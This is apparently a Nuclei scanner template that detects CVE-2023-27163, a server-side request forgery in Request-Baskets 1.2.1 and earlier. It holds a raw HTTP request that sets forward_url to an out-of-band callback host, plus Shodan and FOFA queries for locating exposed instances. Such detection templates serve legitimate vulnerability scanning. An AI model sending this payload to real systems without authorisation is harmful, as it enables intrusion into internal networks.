flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 201
    - contains(body, "token\":")
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - "POST /api/baskets/{{bucketname}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"forward_url\": \"http://{{interactsh-url}}\",\n \
    \ \"proxy_response\": true,\n  \"insecure_tls\": false,\n  \"expand_path\": true,\n\
    \  \"capacity\": 250\n}\n"
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'GET /{{bucketname}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-27163
info:
  author: Jaenact
  classification:
    cpe: cpe:2.3:a:rbaskets:request_baskets:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-27163
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 6.5
    cwe-id: CWE-918
    epss-percentile: 0.99757
    epss-score: 0.92878
  description: 'Request-Baskets <= 1.2.1 allows unauthenticated SSRF via the forward_url
    parameter when creating a new basket.

    '
  impact: 'Attackers can perform SSRF attacks to access internal network resources,
    scan internal systems, or interact with services that should not be accessible
    from external networks.

    '
  metadata:
    fofa-query: body="Request-Baskets"
    max-request: 2
    product: request-baskets
    shodan-query: http.html:"Request-Baskets"
    vendor: darklynx
    verified: true
  name: Request-Baskets <= 1.2.1 - Server Side Request Forgery
  reference:
  - https://github.com/darklynx/request-baskets
  - https://hub.docker.com/r/darklynx/request-baskets
  - https://infosecwriteups.com/exploit-analysis-request-baskets-v1-2-1-server-side-request-forgery-ssrf-688fffd1f424
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27163
  remediation: 'Upgrade to Request-Baskets version 1.2.2 or later that addresses this
    SSRF vulnerability.

    '
  severity: medium
  tags: cve,cve2023,ssrf,request-baskets,oast,proxy,vkev,vuln
variables:
  bucketname: '{{rand_base(7)}}'
